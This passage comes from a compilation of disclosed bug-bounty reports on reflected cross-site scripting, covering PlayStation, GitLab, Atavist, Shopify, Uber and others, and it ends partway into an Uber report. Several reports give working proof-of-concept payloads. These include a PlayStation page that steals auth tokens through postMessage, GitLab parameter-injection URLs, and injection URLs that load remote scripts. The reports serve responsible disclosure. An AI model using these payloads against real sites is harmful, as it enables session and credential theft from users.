              n = JSON.parse(e.data);
            } catch (u) {}
```

These checks can be passed by using `win = window.open("https://transact.playstation.com/")` to launch a new window, then send messages with `win.postMessage`.  This allows a few functions to be called, including `replaceRoute` which allows the current ember route and model to be set:

```javascript
win = window.open("https://transact.playstation.com/");
win.postMessage(JSON.stringify({
                action: "replaceRoute",
                route: "application_error",
                model: { error: 500, title: "injected", message: "from vakzz" }
            }), "*");
``` 

After looking at a few of the routes, `voucher.multi-product-details` has a `sku.longDescription` on the model that is rendered as html and can be used to create an xss if the user is logged in:

```javascript
win.postMessage(JSON.stringify({
                action: "replaceRoute",
                route: "voucher.multi-product-details",
                model: {
                    eligible: true,
                    sku: {
                        id: 0, longDescription: `
                            <img src=x onerror='alert(document.domain)'>`
                    }
                }
            }), "*");
```


Using the XSS, the current tokens from `gcAuth` can be retrieved and posted back to the opening window using:
```javascript
valkyrie.transact.preflightRunner.getPromise("gcAuth").then((gcAuth) => window.opener.postMessage(JSON.stringify(gcAuth), "*"));
```


## Steps To Reproduce:
1. Log into <https://id.sonyentertainmentnetwork.com/id/management>
1. Visit <https://aw.rs/ps4/xss1.html>
1. Click the button and wait 5 seconds
1. The XSS will fire and post a message back to the opening window:


## Supporting Material/References:

Source of <https://aw.rs/ps4/xss1.html>
```html
<!DOCTYPE html>
<html>

<body>
    <button onclick="start()">click me</button>
    <script>
        window.addEventListener("message", (msg) => {
            console.log("got message", msg);
            alert(msg.data);
        });

        async function start() {
            win = window.open("https://transact.playstation.com/", "transact");
            await new Promise((resolve) => setTimeout(resolve, 5000));

            win.postMessage(JSON.stringify({
                action: "replaceRoute",
                route: "voucher.multi-product-details",
                model: {
                    eligible: true,
                    sku: {
                        id: 0, longDescription: `
                            <img src=x onerror='
                                valkyrie.transact.preflightRunner.getPromise("gcAuth").then((gcAuth) => window.opener.postMessage(JSON.stringify(gcAuth), "*"));
                            '>`
                    }
                }
            }), "*");
        }
    </script>
</body>

</html>
```

## Impact

Allows an attacker to execute arbitrary javascript on `transact.playstation.com` if a user visits or clicks on a malicious link, allowing cookies, tokens, and localStorage to be stolen.

---

### [Download full backup and Cross site scripting ](https://hackerone.com/reports/1049040)

- **Report ID:** `1049040`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Reflected
- **Program:** ImpressCMS
- **Reporter:** @kurdishhacked
- **Bounty:** - usd
- **Disclosed:** 2020-12-06T22:10:04.582Z
- **CVE(s):** -

**Summary (team):**

A backup zip file was still left on the server, which was removed. Moreover, an old unused content editor was still left and could be used by a malicious user. The unused editor has been removed as well.

---

### [Cross-Site-Scripting on www.tiktok.com and m.tiktok.com leading to Data Exfiltration](https://hackerone.com/reports/968082)

- **Report ID:** `968082`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Reflected
- **Program:** TikTok
- **Reporter:** @milly
- **Bounty:** - usd
- **Disclosed:** 2020-11-19T23:30:30.381Z
- **CVE(s):** -

**Summary (team):**

The researcher discovered a URL parameter reflecting its value without being properly sanitized and was able to achieve reflected XSS. In addition, researcher found an endpoint which was vulnerable to CSRF.
The endpoint allowed to set a new password on accounts which had used third-party apps to sign-up. Researcher combined both vulnerabilities to achieve a "one click account takeover".

**Summary (researcher):**

While fuzzing, I discovered a URL parameter reflecting its value without being properly sanitized. Thus, I was able to achieve **reflected XSS**. In addition, I found an endpoint which was **vulnerable to CSRF**.
The endpoint enabled me to set a new password on accounts which had used third-party apps to sign-up. I combined both vulnerabilities by crafting a simple JavaScript payload - triggering the CSRF - which I injected into the vulnerable URL parameter from earlier, to archive a **"one click account takeover"**.

---

### [Reflected XSS on a Atavist theme at external_import.php](https://hackerone.com/reports/976657)

- **Report ID:** `976657`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Reflected
- **Program:** Automattic
- **Reporter:** @bugra
- **Bounty:** - usd
- **Disclosed:** 2020-11-18T14:21:52.969Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Hi team,
I found this php file https://magazine.atavist.com/static/external_import.php , and there is a parameter called `scripts` on this php file. 
Basically, the endpoint prints value of `scripts` parameter to `<script src='$Value'>`.
So we can import any script file like that : https://magazine.atavist.com/static/external_import.php?scripts=//15.rs
Or we can write HTML tags too, there is no encoding : https://magazine.atavist.com/static/external_import.php?scripts=%27%3E%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E

This endpoint is also available on other websites. Like :
https://docs.atavist.com/static/external_import.php?scripts=%27%3E%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E
http://www.377union.com/static/external_import.php?scripts=%27%3E%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E

Also there is no secure flag on the session cookie (`periodicSessionatavist`). So this XSS leads to account takeover.

## Impact

Reflected XSS - account takeover via cookie stealing

Thanks,
Bugra

---

### [SafeParamsHelper::safe_params is not so safe](https://hackerone.com/reports/946728)

- **Report ID:** `946728`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Reflected
- **Program:** GitLab
- **Reporter:** @vakzz
- **Bounty:** 4000 usd
- **Disclosed:** 2020-11-02T21:19:01.556Z
- **CVE(s):** -

**Vulnerability Information:**

### Summary

GitLab uses [SafeParamsHelper](https://gitlab.com/gitlab-org/gitlab/-/blob/682a3c0134f2cfec9e5743aa97fbaf2a7d89e65f/app/helpers/safe_params_helper.rb#L8) to filter out some keys before passing them to `url_for`: 

```ruby
  def safe_params
    if params.respond_to?(:permit!)
      params.except(:host, :port, :protocol).permit!
    else
      params
    end
  end
```

The issue is that there are a [lot more dangerous keys](https://github.com/rails/rails/blob/12f3f11f61eccc5d9423b288a08cb1fc7e60999b/actionpack/lib/action_dispatch/routing/route_set.rb#L781):

```ruby
RESERVED_OPTIONS = [:host, :protocol, :port, :subdomain, :domain, :tld_length,
                          :trailing_slash, :anchor, :params, :only_path, :script_name,
                          :original_script_name, :relative_url_root]
```

This means that anywhere `safe_params` is used, the domain could be changed using the `domain` query. Most of the `build_canonical_path` methods call `url_for(safe_params)` which then gets used by [RoutableActions](https://gitlab.com/gitlab-org/gitlab/-/blob/682a3c0134f2cfec9e5743aa97fbaf2a7d89e65f/app/controllers/concerns/routable_actions.rb#L54):

```ruby
def ensure_canonical_path(routable, requested_full_path)
    return unless request.get?

    canonical_path = routable.full_path
    if canonical_path != requested_full_path
      if !request.xhr? && request.format.html? && canonical_path.casecmp(requested_full_path) != 0
        flash[:notice] = "#{routable.class.to_s.titleize} '#{requested_full_path}' was moved to '#{canonical_path}'. Please update any links and bookmarks that may still have the old path."
      end

      redirect_to build_canonical_path(routable)
    end
  end
```

This creates an open redirect in all of the `RoutableActions` routes by making `canonical_path != requested_full_path` (eg using a capital letter) and adding the `domain` param:

1. Visit https://gitlab.com/vakzz-h1/Redirect1?domain=aw.rs
1. You will be redirected to https://aw.rs/

The other key that can be abused is `script_name`, as this is appended to the start of the url and can be used to fake a protocol such as javascript:

1. Visit https://gitlab.com/vakzz-h1/redirect1/-/issues?script_name=javascript:alert(1)//
1. Look at the RSS Feed link

    ```html
<a class="btn btn-svg has-tooltip" data-container="body" title=""  href="javascript:alert(1)//vakzz-h1/redirect1/-/issues.atom?feed_token=XXXX&amp;state=opened" data-original-title="Subscribe to RSS feed">
  <svg class="s16 qa-rss-icon" data-testid="rss-icon">
    <use xlink:href="https://gitlab.com/assets/icons-37f758fe6359f04ae912169432d8ddd9dd45a1316d8fa634996c10bd033e9726.svg#rss"></use>
  </svg>
</a>
   ```
1. On gitlab.com this is blocked by the CSP

There are a bunch of other places that use `safe_params` that could be exploited such as the [_viewer.html.haml](https://gitlab.com/gitlab-org/gitlab/-/blob/682a3c0134f2cfec9e5743aa97fbaf2a7d89e65fapp/views/projects/blob/_viewer.html.haml#L7)

```haml
- viewer_url = local_assigns.fetch(:viewer_url) { url_for(safe_params.merge(viewer: viewer.type, format: :json)) } if load_async
.blob-viewer{ data: { type: viewer.type, rich_type: rich_type, url: viewer_url, path: viewer.blob.path }, class: ('hidden' if hidden) }
```

This allows an attacker to specify the `viewer_url` for the blob url. Since the json returned by the url has an `html` attributes it allows arbitrary html to be inserted. The below uses https://gitlab.com/-/snippets/1999965 as the viewer url and 1 click csp bypass (same as https://hackerone.com/reports/662287#activity-6026826) with https://gitlab.com/-/snippets/1999974/raw for the js payload:

1. Visit https://gitlab.com/vakzz-h1/redirect1/-/blob/master/test.txt?script_name=/-/snippets/1999965/raw%23
1. See the injected HTML:

    ```html
<form>any <b>html</b> can go <button>here<a data-remote="true" data-method="get" data-type="script" href="https://gitlab.com/-/snippets/1999974/raw" class="atwho-view select2-drop-mask pika-select">
  <img width="10000" height="10000">
</a></button></form>
    ```
1. Clicking anywhere will trigger an alert

I've only skimmed the other locations that use `safe_params` but it looks like there are a few more that load data via javascript or could be turned into open redirects. I also haven't looked into the impact of the open redirects to see if they could be escalated to leak sensitive information, I'll update the report if I find anything else.

I've put all of these in a single report as the mitigation is the same for all of them, but if you would like me to split them into separate reports I can do that as well. I've also set the severity to high due to the number of places that this is used and relative ease of trigger it, but the individual issues are probably less so might need to be adjusted. 

### What is the current *bug* behavior?

`SafeParamsHelper.safe_params` only filters out the keys `:host, :port, :protocol` but there are other dangerous ones

### What is the expected *correct* behavior?
`SafeParamsHelper.safe_params` should filter out all of the reserved options:

```ruby
RESERVED_OPTIONS = [:host, :protocol, :port, :subdomain, :domain, :tld_length,
                          :trailing_slash, :anchor, :params, :only_path, :script_name,
                          :original_script_name, :relative_url_root]
```


### Output of checks
This bug happens on GitLab.com

## Impact

* open redirect on quire a few routes
* reflected xss using the `javascript` protocol
* reflected xss with csp bypass using the blob viewer

---

### [Cross-site Scripting (XSS) - Reflected](https://hackerone.com/reports/503988)

- **Report ID:** `503988`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Reflected
- **Program:** 8x8
- **Reporter:** @ht0x0
- **Bounty:** - usd
- **Disclosed:** 2020-07-07T16:17:06.661Z
- **CVE(s):** -

**Summary (team):**

The password reset page of the managers portal of VCC reflected input of the **tenant** parameter without proper encoding considerations.

**Summary (researcher):**

Just wanted to disclose as it's my first ever report on h1.

---

### [Reflected cross-site scripting vulnerability on a DoD website](https://hackerone.com/reports/774792)

- **Report ID:** `774792`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Reflected
- **Program:** U.S. Dept Of Defense
- **Reporter:** @tess
- **Bounty:** - usd
- **Disclosed:** 2020-05-14T17:10:13.763Z
- **CVE(s):** -

**Vulnerability Information:**

Hello there !

I'd like to report a 'XSS' vulnerability on a DoD website *https://███/unit/███ ,
Here in the search engine of the website please enter the following payloads <script>alert(document.domain)</script> & you can even use this payload to steal cookies <script>alert(document.cookie)</script> and hit enter and just scroll you're mouse below the Term: <script>alert(document.domain)</script> to the three icons and as soon as you scroll you're mouse over that three icons you will notice the " pop-up "

FOR CLEAR DEMONSTRATION OF THE VULNERABILITY PLEASE REFER TO THE PROOF-OF-CONCEPT ATTACHED TO THIS REPORT.

Thanks,
████

## Impact

XSS vulnerabilities can be used to trick a web user into executing a malicious script, potentially revealing a user's web session information or modify web content & even steal cookies.

---

### [The URL in "Choose a data source'' at "https://bi.owox.com/ui/settings/connected-services/setup/" is not filtered => reflected XSS.](https://hackerone.com/reports/733051)

- **Report ID:** `733051`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Reflected
- **Program:** OWOX, Inc.
- **Reporter:** @imthehackerlor
- **Bounty:** - usd
- **Disclosed:** 2019-12-09T15:33:39.748Z
- **CVE(s):** -

**Vulnerability Information:**

Hi team,
This is another report with #732987. Because it is completely independent

Detail
--
In the process of selecting the data source at https://bi.owox.com/ui/settings/connected-services/setup/, I found a reflected XSS.
Specifically, when you click on ``Google Analytics``, a page will appear for you to enter ``Gmail``. After completing the steps, an error link will appear during the redirect (Screenshot)
███

Vulnerable area:
----
``/analytics/``
The URL will now be: https://bi.owox.com/ui/callbacks/google-supervisors/analytics%3Cimg%20src=xss%20onerror=prompt(1)%3E/?state=d159b8264eef78b11afdd016531b128c&code=4/tAFEdKitWAD6NCxUfXRT4NMTLMnzMwHeDlac-un9ecDEce9Ts2EZ6_pN-giK_3uzKVeRS9rYuAnbihIaXRFfkvE&scope=email%20https://www.googleapis.com/auth/userinfo.email%20https://www.googleapis.com/auth/analytics%20https://www.googleapis.com/auth/analytics.edit%20https://www.googleapis.com/auth/analytics.readonlyopenid&authuser=3&session_state=c7730a7cbcf834250345c43eaa83103ec536e3a4..3ebd&prompt=consent

Tested browser
---
Firefox
Chrome

PoC
---
+ Note: I have shortened the URL to facilitate testing.

1, go to https://bi.owox.com/ui/callbacks/google-supervisors/analytics%3Cimg%20src=xss%20onerror=prompt(1)%3E/?state=d159b8264eef78b11afdd016531b128c
2, Log in and ``XSS`` will execute
██████

## Impact

>This vulnerability is aimed at all victims. Just paste this URL and login, XSS will automatically execute.
Therefore, it will have a ``high impact``, because before XSS is executed, the application will ask the user to login.
+ The attacker can execute JS code.

>Documents related to Impact
--
https://portswigger.net/web-security/cross-site-scripting/reflected
https://portswigger.net/web-security/cross-site-scripting/exploiting

Best regards,
@dat

---

### [Reflected XSS ](https://hackerone.com/reports/732987)

- **Report ID:** `732987`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Reflected
- **Program:** OWOX, Inc.
- **Reporter:** @imthehackerlor
- **Bounty:** - usd
- **Disclosed:** 2019-12-09T15:24:52.729Z
- **CVE(s):** -

**Vulnerability Information:**

Hi team,

I have found an XSS at https://bi.owox.com/ui/6177527534dc114eb07fa829e4ce4d28/dashboard/?trial=activated
Because the input is not properly filtered, resulting in XSS being executed
Vulnerable area: 
-----
``6177527534dc114eb07fa829e4ce4d28``
The URL will now be: https://bi.owox.com/ui/6177527534dc114eb07fa829e4ce4d28%3Cimg%20src=xss%20onerror=prompt('XSS')%3E/dashboard/?trial=activated

PoC
---
1, go to https://bi.owox.com/ui/6177527534dc114eb07fa829e4ce4d28%3Cimg%20src=xss%20onerror=prompt('XSS')%3E/dashboard/?trial=activated
2, Log in and ``XSS`` will execute
██████████

Tested browser
---
Firefox 
Chrome

## Impact

This vulnerability is aimed at all victims and they do not need to be involved in the ``Project``. Just paste this URL and login, XSS will automatically execute.
Therefore, it will have a ``high impact``, because before XSS is executed, the application will ask the user to login.
+ The attacker can execute JS code.
████████
████████

Documents related to ``Impact``
---
https://portswigger.net/web-security/cross-site-scripting/reflected
https://portswigger.net/web-security/cross-site-scripting/exploiting

Recommendation
----
+ Revisit the entire application and validate the user input at server side.
+ Sanitize the data collected from input fields before further processing.
+ Filter out special and meta-characters from user input.

Best regards,
@dat

---

### [Reflected XSS](https://hackerone.com/reports/739601)

- **Report ID:** `739601`
- **Severity:** Critical
- **Weakness:** Cross-site Scripting (XSS) - Reflected
- **Program:** Bumble
- **Reporter:** @0xnazmul
- **Bounty:** 1000 usd
- **Disclosed:** 2019-11-21T11:39:36.597Z
- **CVE(s):** -

**Summary (team):**

The researcher has found an XSS when sending messages through our service.

---

### [Reflective Cross-site Scripting via Newsletter Form](https://hackerone.com/reports/709336)

- **Report ID:** `709336`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Reflected
- **Program:** Shopify
- **Reporter:** @gam817
- **Bounty:** 2000 usd
- **Disclosed:** 2019-10-11T17:38:59.054Z
- **CVE(s):** -

**Vulnerability Information:**

*.myshopify.com is vulnerable to a reflective cross-site scripting attack in the newsletter form. This can be crafted to trigger on a page load without any further user interaction.

The following example url shows this vulnerability:
```
https://testbuguser.myshopify.com/?contact[email]%20onfocus%3djavascript:alert(%27xss%27)%20autofocus%20a=a&form_type[a]aaa
```

This was tested on a newly registered store "testbuguser.myshopify.com"

If you require any additional details, please do not hesitate to bump.

## Impact

This attack could be leveraged to compromise administrative sessions or perform actions on behalf of users with the same level of privilege as the user.

**Summary (researcher):**

This is a reflective cross-site scripting in the newsletter signup feature of *.myshopify.com websites. It involves a filter bypass by using Ruby-on-Rails mass assignment to insert quotes (") which are not user supplied and therefore are not being filtered by the application.

This allows escaping the value attribute on an input tag to add an onfocus attribute which contains javascript and finishing it off with an autofocus to trigger the event on page load.

Extra spaces and square brackets "[]" were causing the payload to fail which made it difficult to retrieve sensitive data from requests to the admin panel. This was circumvented by using "split", "slice", "pop" and "shift" to move around the response data to grab administrative API keys from the /admin/apps endpoint.

---

### [Reflected XSS on https://make.wordpress.org via 'channel' parameter](https://hackerone.com/reports/659419)

- **Report ID:** `659419`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Reflected
- **Program:** WordPress
- **Reporter:** @gnux
- **Bounty:** - usd
- **Disclosed:** 2019-08-26T00:45:03.993Z
- **CVE(s):** -

**Vulnerability Information:**

Hi there,
I just found a reflected XSS on make.wordpress.org domain.

steps to reproduce : 
1. visit this link :
https://make.wordpress.org/chat/logs?channel=16%22%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E&date=2019-07-21&no_bots=1
2. xss pop up will occurs

POC:
see:wp reflected xss.png

Note: it works on the latest version of firefox

## Impact

some of xss impact like stealing cookies, session hijacking, etc ..

---

### [Reflected XSS on $Any$.myshopify.com/admin](https://hackerone.com/reports/422707)

- **Report ID:** `422707`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Reflected
- **Program:** Shopify
- **Reporter:** @dr_dragon
- **Bounty:** 1500 usd
- **Disclosed:** 2018-11-13T10:16:42.532Z
- **CVE(s):** -

**Vulnerability Information:**

# Description :
Hi,
I have found a reflected cross site scripting vulnerability in <any>.myshopify.com/admin through return_url parameter .

# Step to reproduce :
1-Go to https://<Any>.myshopify.com/admin/authenticate?return_url=javascript:alert(100)//
2-Click on reload this page
3-Xss alert message

## Impact

Xss attack in <Any>.myshopify.com/admin

---

### [Reflected XSS on secure.chaturbate.com](https://hackerone.com/reports/413412)

- **Report ID:** `413412`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Reflected
- **Program:** Chaturbate
- **Reporter:** @glc
- **Bounty:** 800 usd
- **Disclosed:** 2018-10-18T05:04:36.494Z
- **CVE(s):** -

**Summary (team):**

The hacker found that an external asset used for fraud detection on secure.chaturbate.com was not sanitizing input parameters and could be used for reflected XSS.  This external asset was removed.

---

### [Reflected XSS](https://hackerone.com/reports/304175)

- **Report ID:** `304175`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Reflected
- **Program:** Ubiquiti Inc.
- **Reporter:** @aidantwoods
- **Bounty:** - usd
- **Disclosed:** 2018-09-25T13:06:22.793Z
- **CVE(s):** -

**Summary (team):**

Due to the lack of sanitisation in the commend area, with a especially crafted message, is possible to execute a XSS with the "preview" function. If a draft is save, is possible to exploit this bug using as and stored-XSS.

**Summary (researcher):**

The "New Discussion" page on the Spanish and Portuguese forums have a feature in which a user may leave a HTML comment.
The post itself will not yield XSS, but the comment prior to sanitisation would be rendered on the page before posting. An attacker may exploit this via GET variables to yield a reflected XSS. They may escalate this to a stored XSS with their scripting privileges by saving a payload as a draft.
This attack may be initiated directly by linking a logged in user to one of these pages, or indirectly by abusing the domain trust from a validated redirect, e.g. a post-login redirect elsewhere on the `*.ubnt.com` origin.

---

### [Reflected XSS в /al_audio.php](https://hackerone.com/reports/334691)

- **Report ID:** `334691`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Reflected
- **Program:** VK.com
- **Reporter:** @executor
- **Bounty:** 700 usd
- **Disclosed:** 2018-05-22T17:38:27.422Z
- **CVE(s):** -

**Summary (team):**

XSS в аудио.

**Summary (researcher):**

XSS в прикреплении аудиозаписи в виджете комментариев.

---

### [[bracket-template] Reflected XSS possible when variable passed via GET parameter is used in template](https://hackerone.com/reports/317125)

- **Report ID:** `317125`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Reflected
- **Program:** Node.js third-party modules
- **Reporter:** @bl4de
- **Bounty:** - usd
- **Disclosed:** 2018-04-09T14:58:19.748Z
- **CVE(s):** -

**Vulnerability Information:**

Hi Guys,

I would like to report Reflected XSS in bracket-template module.
It allows to inject arbitrary JavaScript tag and malicious code to execute when variables read from GET are used directly in template without sanitization.

## Module

**module name:** bracket-template
**version:** 1.1.5
**npm page:** https://www.npmjs.com/package/bracket-template

### Description

Minimal (über fast) Javascript engine compatible with node.js and browsers.

### Module Stats

Stats:

51 downloads in the last day
209 downloads in the last week
835 downloads in the last month

~10000 estimated downloads per year

## Description

While testing ```bracket-template``` module, I've found that there is possibility to inject malicious ```<script>``` tag followed by JavaScript code when values passed via GET are used in templates directly, without any sanitization.

## Steps To Reproduce:

- install ```bracket-template``` module:

```
$ npm install bracket-template
```

- create sample aaplication, which reads ```name``` from url and displays welcome message in the browser:

```javascript
// app.js file
const http = require('http')
const bracket = require('bracket-template').default
const port = 8080

function createHTML(name) {
    let tpl = `
        [[ const n = '${name}'; ]]
        <strong>Hello [[= n ]]</strong>
    `
    return bracket.compile(tpl)
}

const requestHandler = (request, response) => {
    const name = request.url.split('=')[1]
    response.writeHeader(200, { "Content-Type": "text/html" });
    response.write(createHTML(name)());
    response.end();
}

const server = http.createServer(requestHandler)

server.listen(port, (err) => {
    if (err) {
        return console.log(err)
    }
    console.log(`server is listening on ${port}`)
})
```

- run application:

```
$ node app.js
```

- open ```http://localhost:8080?name=bl4de``` in the browser. You will notice expected result:

{F264368}

- now, try to inject following malicious XSS payload: ```http://localhost:8080?name=bl4de<script>console.log('XSS?')</script>```. You will notice all HTML special characters were escaped:

{F264369}


- this time, use following payload: ```http://localhost:8080/?name=bl4de\x3cscript\x3econsole.log(\x22uh\x20oh,\x20XSS...\x20:(\x22)\x3c\x2fscript\x3e``` and see the result in browser dev tools console:


{F264370}


When we investigate HTML returned from the server, we can notice using ```\x[hex][hex]``` notation allows to inject any HTML special character and crafts XSS payload:

```HTML
<strong>Hello bl4de<script>console.log("uh oh, XSS... :(")</script></strong>
```

Also, I have noticed that this vector is not detected by built-in XSS protection (XSS Auditor) in Blink/WebKit based browsers (Chromium, Safari, Chrome, Opera), which causes additional risk for anyone who uses ```bracket-template``` in production application.


## Supporting Material/References:

This issue was found and tested with following setup:

- macOS HighSierra 10.13.3
- Node.js v.8.9.3
- npm v. 5.5.1
- Chromium 66.0.3342.0, Safari 11.03 (with XSS Auditor enabled), Chrome 64.0.3282.167 (with XSS Auditor enabled)

## Wrap up

- I contacted the maintainer to let him know: No
- I opened an issue in the related repository: No

Regards,

Rafal 'bl4de' Janicki

## Impact

This issue can be used by malicious user to exploit Reflected XSS against application  which outputs variables passed via GET parameters directly in template(s) without any sanitization.

---

### [Reflected XSS in admin settings](https://hackerone.com/reports/303480)

- **Report ID:** `303480`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Reflected
- **Program:** Deconf
- **Reporter:** @sandeeptanwani
- **Bounty:** - usd
- **Disclosed:** 2018-02-24T18:52:43.542Z
- **CVE(s):** -

**Summary (team):**

The researcher and our team determined that actually there wasn't any applicable vulnerability.

---

### [MediaElements XSS](https://hackerone.com/reports/299112)

- **Report ID:** `299112`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Reflected
- **Program:** WordPress
- **Reporter:** @shay12tg
- **Bounty:** - usd
- **Disclosed:** 2018-02-15T23:14:12.452Z
- **CVE(s):** -

**Summary (team):**

The reporter disclosed a reflected XSS vulnerability in MediaElement's Flash files, which are bundled in WordPress. 

MediaElement and WordPress released versions 4.2.8 and 4.9.2, respectively, which resolve the issue.

---

### [muber-id Query Parameter Can Generate SSL-protected Reflected XSS in https://m.uber.com/0-dfffb25d2cf6ceeb0a27.js Endpoint](https://hackerone.com/reports/300102)

- **Report ID:** `300102`
- **Severity:** Critical
- **Weakness:** Cross-site Scripting (XSS) - Reflected
- **Program:** Uber
- **Reporter:** @gregoryvperry
- **Bounty:** - usd
- **Disclosed:** 2017-12-26T11:05:15.758Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary
The muber-id request parameter at the https://m.uber.com/0-dfffb25d2cf6ceeb0a27.js mobile endpoint is copied into a javascript string encapsulated in double quotation marks, resulting in SSL-protected payloads being reflected unmodified in the application's response. The script-src whitelist at the endpoint includes a wildcard *.cloudfront.net host, which could be used by any attacker with an Amazon Web Services account to provision an arbitrary cloudfront.net host to serve trusted files from. The endpoint also has a missing base-uri, which allows the injection of base tags. They can be used to set the base URL for all relative (script) URLs to an attacker controlled domain. In addition to the reflected XSS issue, both the script-src and basi-uri issues are considered high severity findings under Content Security Policy 3.

## Security Impact
Using the muber-id query variable, arbitrary SSL-protected XSS can be reflected unescaped from the https://m.uber.com/0-dfffb25d2cf6ceeb0a27.js mobile endpoint, resulting in the ability for an attacker to generate arbitrary javascript and/or html content.

## Reproduction Steps
https://m.uber.com/0-dfffb25d2cf6ceeb0a27.js?muber-id=%22%7D}</script><div%20class%3D%27_b%20_c%20_d%20_e%20_f%20_g%20_h%20_i%20_a3%20_a4%20_a5%20_a6%20_a7%20_a8%20_a9%20_aa%20_ab%20_ac%20_ad%20_ae%20_af%20_ag%20_ah%20_ai%20_aj%20_ak%20_al%20_am%20_an%20_ao%20_ap%20_aq%20_ar%20_as%20_at%20_au%20_av%20_aw%27><a%20href%3D"http%3A%2F%2Fwww.lyft.com">Some%20arbitrary%20link%20text<%2Fa><%2Fdiv>%0A

## Impact

With a properly crafted javascript and/or html page, an attacker could harvest Uber login and password credentials, credit card payment information etc.

---

### [lite:sess Query Parameter Can Generate SSL-protected Reflected XSS in https://m.uber.com/0-dfffb25d2cf6ceeb0a27.js Endpoint](https://hackerone.com/reports/300101)

- **Report ID:** `300101`
- **Severity:** Critical
- **Weakness:** Cross-site Scripting (XSS) - Reflected
- **Program:** Uber
- **Reporter:** @gregoryvperry
- **Bounty:** - usd
- **Disclosed:** 2017-12-26T11:04:49.924Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary
The lite:sess request parameter at the https://m.uber.com/0-dfffb25d2cf6ceeb0a27.js mobile endpoint is copied into a javascript string encapsulated in double quotation marks, resulting in SSL-protected payloads being reflected unmodified in the application's response. The script-src whitelist at the endpoint includes a wildcard *.cloudfront.net host, which could be used by any attacker with an Amazon Web Services account to provision an arbitrary cloudfront.net host to serve trusted files from. The endpoint also has a missing base-uri, which allows the injection of base tags. They can be used to set the base URL for all relative (script) URLs to an attacker controlled domain. In addition to the reflected XSS issue, both the script-src and basi-uri issues are considered high severity findings under Content Security Policy 3.

## Security Impact
Using the lite:sess query variable, arbitrary SSL-protected XSS can be reflected unescaped from the https://m.uber.com/0-dfffb25d2cf6ceeb0a27.js mobile endpoint, resulting in the ability for an attacker to generate arbitrary javascript and/or html content.

## Reproduction Steps
https://m.uber.com/0-dfffb25d2cf6ceeb0a27.js?lite:sess=%22%7D}</script><div%20class%3D%27_b%20_c%20_d%20_e%20_f%20_g%20_h%20_i%20_a3%20_a4%20_a5%20_a6%20_a7%20_a8%20_a9%20_aa%20_ab%20_ac%20_ad%20_ae%20_af%20_ag%20_ah%20_ai%20_aj%20_ak%20_al%20_am%20_an%20_ao%20_ap%20_aq%20_ar%20_as%20_at%20_au%20_av%20_aw%27><a%20href%3D"http%3A%2F%2Fwww.lyft.com">Some%20arbitrary%20link%20text<%2Fa><%2Fdiv>%0A

## Impact

With a properly crafted javascript and/or html page, an attacker could harvest Uber login and password credentials, credit card payment information etc.

---

### [udi-id Query Parameter Can Generate SSL-protected Reflected XSS in https://m.uber.com/0-dfffb25d2cf6ceeb0a27.js Endpoint](https://hackerone.com/reports/300103)

- **Report ID:** `300103`
- **Severity:** Critical
- **Weakness:** Cross-site Scripting (XSS) - Reflected
- **Program:** Uber
- **Reporter:** @gregoryvperry
- **Bounty:** - usd
- **Disclosed:** 2017-12-26T11:04:34.017Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary
The udi-id request parameter at the https://m.uber.com/0-dfffb25d2cf6ceeb0a27.js mobile endpoint is copied into a javascript string encapsulated in double quotation marks, resulting in SSL-protected payloads being reflected unmodified in the application's response. The script-src whitelist at the endpoint includes a wildcard *.cloudfront.net host, which could be used by any attacker with an Amazon Web Services account to provision an arbitrary cloudfront.net host to serve trusted files from. The endpoint also has a missing base-uri, which allows the injection of base tags. They can be used to set the base URL for all relative (script) URLs to an attacker controlled domain. In addition to the reflected XSS issue, both the script-src and basi-uri issues are considered high severity findings under Content Security Policy 3.

## Security Impact
Using the udi-id query variable, arbitrary SSL-protected XSS can be reflected unescaped from the https://m.uber.com/0-dfffb25d2cf6ceeb0a27.js mobile endpoint, resulting in the ability for an attacker to generate arbitrary javascript and/or html content.

## Reproduction Steps
https://m.uber.com/0-dfffb25d2cf6ceeb0a27.js?udi-id="%7D}</script><div%20class%3D%27_b%20_c%20_d%20_e%20_f%20_g%20_h%20_i%20_a3%20_a4%20_a5%20_a6%20_a7%20_a8%20_a9%20_aa%20_ab%20_ac%20_ad%20_ae%20_af%20_ag%20_ah%20_ai%20_aj%20_ak%20_al%20_am%20_an%20_ao%20_ap%20_aq%20_ar%20_as%20_at%20_au%20_av%20_aw%27><a%20href%3D"http%3A%2F%2Fwww.lyft.com">Some%20arbitrary%20link%20text<%2Fa><%2Fdiv>%0A

## Impact

With a properly crafted javascript and/or html page, an attacker could harvest Uber login and password credentials, credit card payment information etc.

---

### [SSL-protected Reflected XSS in https://m.uber.com/0-dfffb25d2cf6ceeb0a27.js Endpoint](https://hackerone.com/reports/300081)

- **Report ID:** `300081`
- **Severity:** Critical
- **Weakness:** Cross-site Scripting (XSS) - Reflected
- **Program:** Uber
- **Reporter:** @gregoryvperry
- **Bounty:** - usd
- **Disclosed:** 2017-12-26T11:03:53.114Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary
